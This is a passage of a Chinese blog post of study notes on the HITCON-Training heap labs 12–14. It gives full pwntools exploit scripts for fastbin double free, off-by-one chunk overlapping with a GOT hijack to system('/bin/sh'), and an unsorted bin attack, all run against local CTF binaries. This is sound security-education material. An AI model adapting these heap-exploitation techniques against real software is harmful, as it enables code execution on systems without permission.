p64<span class="token punctuation">(</span>ptr<span class="token number">-0x18</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># fd</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># bk</span>payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span>        <span class="token comment" spellcheck="true"># 还有0x10个单位空余，将其填充</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 对于第一个chunk的前一个大小，因为我们要合并</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 需要加上头部，一会儿试试不加头部行不行</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>atoi_addr <span class="token operator">=</span> <span class="token number">0x0000000000602068</span>atoi_offset <span class="token operator">=</span> <span class="token number">0x36e80</span>system_offset <span class="token operator">=</span> <span class="token number">0x45390</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>atoi_addr<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0 : "</span><span class="token punctuation">)</span>atoi <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> atoi <span class="token operator">-</span> atoi_offsetsystem_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> system_offsetedit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Lab12"><a href="#Lab12" class="headerlink" title="Lab12"></a>Lab12</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/39.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/40.png"></div>两次malloc，第一次是给flower结构体分配，第二次是给flower的名字进行分配，大小自己指定。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/41.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/42.png"></div>注意这里指针置空，不能使用UAF。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/43.png"></div>后门函数！我们开始考虑使用Double free的方法。<p>仔细看看上面的源码不难发现，目标就是一个劫持eip到magic函数。考虑eip劫持方法：栈溢出，修改got表，格式化字符串。</p><p>在这里我们可以先考虑修改got表，因为在成功分配chunk并且输入正确的情况下会调用puts函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/44.png"></div>我们考虑是不是可以利用double free的方法来修改fd指针，从而使其指向got表的位置，以此来修改puts的地址。<h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><p>第一点知识：hijack got</p><p>当我们执行puts函数时先去plt表执行代码</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/45.png"></div>第一条指令jump *xxxx。但是xxxx到底是哪个位置？也就是红箭头所指向的位置。我们再看看该位置又是什么东西。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/46.png"></div>也就是执行4007a6位置的这条指令。我们如果将这条指令地址改为aaaa，那么他就去执行aaaa地址的指令。（这里可以修改两次：一次是将jmp这条指令改为其他，第二次是将跳过去的地址中的指令进行修改）<p>第二点：double free的知识：</p><p>double free首先是针对fast bin的，单链表结构。fd指向下一个分配的空闲chunk。后入先出的顺序。分配chunk的时候检查size位置是否满足大小。</p><p>free(0)<br>free(1)<br>free(0)<br>malloc(0)<br>将0中写入一个地址，此时就是fd的位置。那么0就将指向该地址。当malloc两次之后，bin就指向该地址。再次malloc就将分配这个地址的这个chunk。就可以修改相关内容。</p><p>exp</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./secretgarden"</span><span class="token punctuation">)</span>magic_addr <span class="token operator">=</span> <span class="token number">0x400c7b</span>fake_chunk_addr <span class="token operator">=</span> <span class="token number">0x601ffa</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span>name<span class="token punctuation">,</span>color<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span>color<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"red"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"blue"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>fake_chunk_addr<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"red"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"blue"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"red"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">22</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>magic_addr<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"red"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Lab13-overlapping"><a href="#Lab13-overlapping" class="headerlink" title="Lab13 overlapping"></a>Lab13 overlapping</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/47.png"></div>创建部分：先分配一个heap的结构体，再分配一个content内容的chunk，读入这里没有什么漏洞。删除部分：置空，没有UAF。编辑部分：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/48.png"></div>有一个off by one漏洞 显示部分：无漏洞<p>利用刚刚所学overlapping还有off by one的技巧：<br>第一步：创建两个heap，通过off by one的技巧将第二个chunk的size位改的更大，并释放。这样chunk头 就可以覆盖到下面的部分了。<br>第二步：创建一个稍大的chunk，这里的chunk要分配到之前释放的那个chunk。这样就可以修改heap信息结构体中的指针了<br>第三步：填入某个函数地址信息，计算libc基址<br>第四步：将某个常用函数写入指针，该指针指向system函数<br>第三次分配大chunk时的示意图</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/49.png"></div><p><strong>调试步骤</strong>：</p><p>第一步：off by one修改下一个chunk首地址：<br>create(0x18,”aaaa”) # create 0<br>create(0x10,”bbbb”) # create 1<br>edit(0,”a”*0x18+”\x41”)<br>注意：这里有用到一个分配策略，当分配小于两倍字长的请求，系统会直接返回两倍字长的chunk。（32位就是0x10,64位是0x20）也就是当 分配18个单位是，18&lt;32。所以 系统连着chunk header会给0x20个单位。但是除去0x10的header，0x10怎么放18个单位呢。注意它会占用下一个chunk的pre_size位。所以我们就可以通过这种方式直接覆盖掉下一个chunk的size位。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/50.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/51.png"></div><p>第二步：修改成功，接下来就是释放。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/52.png"></div>可以看到类似于空间复用。我们再次进行分配看看是什么样子：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/53.png"></div><p>第三步：控制heap结构体：</p><p>整块都是content，但是60开始又是heapinfo结果体。所以heapinfo部分malloc了两次。content一次，heapinfo结构体分配一次。content可以写入heapinfo中，从而控制指针。</p><p>create(0x30,p64(0)*4+p64(0x30)+p64(elf.got[‘atoi’])) # create 1</p><p>第四步：算出system：</p><p>libc = elf.libc<br>p.recvuntil(“Content :”)<br>addr =  u64(p.recvuntil(“\x7f”)[-6:].ljust(8, “\x00”))<br>libc_base = addr - libc.symbols[“atoi”]<br>system_addr =  libc.symbols[‘system’] + libc_base</p><p>第五步：修改atoi位置位system地址，劫持got<br>edit(1,p64(system_addr))<br>p.sendline(‘/bin/sh\x00’)</p><p>exp</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./heapcreator"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./heapcreator"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size of Heap : '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content of heap:'</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content of heap : '</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create 0</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"bbbb"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create 1</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span><span class="token string">"\x41"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create 1</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content : "</span><span class="token punctuation">)</span>addr <span class="token operator">=</span>  u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"atoi"</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span>  libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseedit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Lab14（unsorted-bin-attack）"><a href="#Lab14（unsorted-bin-attack）" class="headerlink" title="Lab14（unsorted bin attack）"></a>Lab14（unsorted bin attack）</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/54.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/55.png"></div>edit无长度检查，那么就可以伪造下一个chunk来完成。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/56.png"></div>magic需要大于4869。<h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><p>步骤一：利用unlink进行迁移chunk位置，修改magic的值<br>步骤二：利用unlink直接修改指针，hijacking got<br>步骤三：利用unsorted bin attack，令bk等于magic地址-0x10。malloc之后令magic的值等于下一个chunk的首地址，从而成功修改（在这里我们选择第三种）</p><p>所谓的unsorted bin attack：<br>首先不是fastbin chunk就先放到unsorted  bin中。<br>其次先进先出的模式。<br>最后bk指针会被后面的chunk首地址所赋值：<br>说明确一点：就是说用一个地址写入将要malloc的chunk中bk中，那么malloc之后这个地址中的值就等于写入前chunk中bk的值</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = "debug"</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#context.terminal = ['tmux','split','-h']</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./magicheap"</span><span class="token punctuation">)</span>hack_addr <span class="token operator">=</span> <span class="token number">0x400c23</span>magic_addr <span class="token operator">=</span> <span class="token number">0x6020c0</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Heap : "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"heap:"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Heap : "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"heap : "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>payload <span class="token operator">=</span> <span class="token number">0x80</span><span class="token operator">*</span><span class="token string">'a'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>magic_addr<span class="token number">-0x10</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"d"</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4869"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="思路二"><a href="#思路二" class="headerlink" 